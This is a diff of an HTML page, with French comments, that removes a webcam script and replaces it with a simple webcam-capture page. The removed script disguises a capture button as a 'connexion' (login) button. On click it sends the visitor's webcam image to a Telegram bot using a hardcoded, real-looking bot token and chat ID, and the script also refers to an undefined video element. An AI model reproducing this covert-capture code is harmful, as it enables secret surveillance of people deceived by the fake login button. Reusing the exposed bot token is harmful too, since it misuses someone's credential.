@@ -1,69 +1,16 @@
-<script>
-// Vérifier si le navigateur prend en charge la contrainte de média
-if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-  // Demander l'accès à la webcam
-  navigator.mediaDevices.getUserMedia({ video: true })
-    .then(function(stream) {
-      // Créer un élément vidéo pour afficher le flux de la webcam
-
-      // Créer un bouton pour prendre une capture
-      const captureButton = document.createElement('button');
-      captureButton.textContent = 'connexion';
-      document.body.appendChild(captureButton);
-
-      // Créer un canvas pour dessiner la capture
-      const canvas = document.createElement('canvas');
-      const context = canvas.getContext('2d');
-      document.body.appendChild(canvas);
-
-      // Fonction pour prendre une capture
-      captureButton.addEventListener('click', function() {
-        // Redimensionner le canvas à la taille de la vidéo
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-
-        // Dessiner le cadre actuel de la vidéo sur le canvas
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-        // Convertir la capture en une image de données
-        const dataURL = canvas.toDataURL('image/jpeg');
-
-        // Envoyer l'image au bot Telegram
-        // Remplacez 'YOUR_BOT_TOKEN' par le jeton de votre bot Telegram
-        // Remplacez 'YOUR_CHAT_ID' par l'ID de votre chat Telegram
-        fetch('https://api.telegram.org/bot7448490532:AAHS5vRJGbXLM6uC3Ym8JGQLnOI7FmbMcBI/sendPhoto?chat_id= 6798669588', {
-          method: 'POST',
-          body: JSON.stringify({
-            photo: dataURL
-          })
-        })
-        .then(response => {
-          console.log('Image envoyée avec succès !');
-        })
-        .catch(error => {
-          console.error('Erreur lors de l\'envoi de l\'image :', error);
-        });
-      });
-    })
-    .catch(function(err) {
-      console.error('Erreur d\'accès à la webcam :', err);
-    });
-} else {
-  // Le navigateur ne prend pas en charge la contrainte de média
-  console.error('Votre navigateur ne prend pas en charge la contrainte de média.');
-}
-
-</script>
-<!DOCTYPE HTML>
-
-<html>
-
+<!DOCTYPE html>
+<html lang="fr">
 <head>
-  <title>Untitled</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Capture Webcam</title>
 </head>
-
 <body>
+    <h1>Capture d'image de la Webcam</h1>
+    <video id="video" width="640" height="480" autoplay></video>
+    <button id="capture">Capturer l'image</button>
+    <canvas id="canvas" style="display: none;"></canvas>
 
+    <script src="script.js"></script>
 </body>
-
 </html>
